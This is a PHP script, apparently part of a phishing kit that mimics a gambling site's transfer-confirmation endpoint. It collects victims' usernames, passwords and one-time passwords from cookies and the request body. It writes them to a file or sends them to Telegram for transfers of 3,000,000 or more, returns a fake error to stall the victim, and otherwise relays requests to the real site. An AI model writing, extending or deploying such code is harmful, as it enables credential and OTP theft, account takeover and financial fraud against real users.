<?php
include "get_config.php";

// lấy config
$gate = isset($_GET["gate"]) ? $_GET["gate"] : "G88";
$gate_config = get_config($gate);

//bóc tách dữ liệu
$raw_content = file_get_contents("php://input");
$json_data = json_decode($raw_content, true);
$auth_token = $_SERVER["HTTP_AUTHORIZATION"];
$token = explode(' ', $auth_token)[1];
$username = $_COOKIE["username"];
$password = $_COOKIE["password"];
$otp_type = $json_data["OTPType"] == 1 ? "SMS" : "Telesafe";
$otp = $json_data["OTP"];

// Nếu bật lưu otp xác nhận chuyển khoản
if ($gate_config["save_otp_transfer_confirm"]) {
	$time = date("H:i:s Y-m-d");
	$ip = $_SERVER["REMOTE_ADDR"];
	$fp = fopen($gate_config["file_transfer_confirm"], "a+");
	fwrite($fp, "$username|$password|$otp_type|$otp|$time|$ip\n");
	fclose($fp);
	die('{"c":-1023,"m":""}');
}

// Nếu bật thông báo tele
if ($gate_config["save_otp_transfer"] && intval($_COOKIE["amount"]) >= 3000000) {
	$domain = strpos($gate, '88') !== false ? "$gate.vin" : "$gate.win";
	$msg = "[$gate] Tài khoản: $username, Mật khẩu: $password, Loại: $otp_type, OTP: $otp vừa xác nhận OTP chuyển khoản! $domain?token=$token";
	send_telegram_transfer($msg);
	die('{"c":-1023,"m":""}');
}

echo confirm_transfer($raw_content, $list_header);

function confirm_transfer($raw_content, $list_header)
{
	global $gate_config;
	$url = "https://profile.".$gate_config["domain"]."/api/Payment/TransferAccoutConfirm";
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, $url);
	curl_setopt($ch, CURLOPT_POST, true);
	curl_setopt($ch, CURLOPT_HTTP_VERSION, '1.1');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
	curl_setopt($ch, CURLOPT_HEADER, true);
	curl_setopt($ch, CURLOPT_POSTFIELDS, $raw_content);
	curl_setopt($ch, CURLOPT_HTTPHEADER, $list_header);
	$raw_content = curl_exec($ch);

	$re = "/Set-Cookie: ([^;]+)/m";
	preg_match_all($re, $raw_content, $matches, PREG_SET_ORDER, 0);
	foreach ($matches as $match) {
		$key = explode("=", $match[1])[0];
		$val = urldecode(explode("=", $match[1])[1]);
		setcookie($key, $val, time() + (86400 * 30), "/");
	}
	return explode("\r\n\r\n", $raw_content)[1];
}
?>